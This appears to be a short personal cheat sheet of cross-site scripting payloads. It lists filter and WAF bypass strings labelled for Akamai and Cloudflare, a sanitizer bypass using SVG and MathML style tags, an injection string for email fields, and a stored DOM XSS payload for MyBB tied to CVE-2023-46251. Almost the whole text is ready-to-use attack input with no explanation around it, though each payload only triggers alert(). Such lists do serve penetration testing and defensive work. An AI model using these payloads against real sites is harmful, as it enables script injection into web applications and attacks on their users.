
# Bypasses

General 1:

```
`url=%26%2302java%26%23115cript:alert(document.domain)`
```

Akamai [[WAF Bypass]] 1:

```
1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
```

Cloudflare [[WAF Bypass]] 1:

```
"><body/onload="{x:onerror=alert};x
```

Cloudflare [[WAF Bypass]] 2:

```
<inpuT autofocus oNFocus="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
```

Hide payload in style tag of an SVG or math element for [[WAF Bypass]] or sanitizer bypass:

```
<svg><style> <script>alert(1)</script> </style></svg> <math><style> <img src onerror=alert(2)> </style></math>
```
# Field

Email field 1:

```
test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
```

# Stored
# Stored DOM

## MyBB

CVE-2023-46251 - Stored DOM XSS in MyBB < 1.8.37

```
[size='1337px;\">>\<img/src=ccc/ onerror=alert`1`//id=name //&pt;']eviltext[/size]
```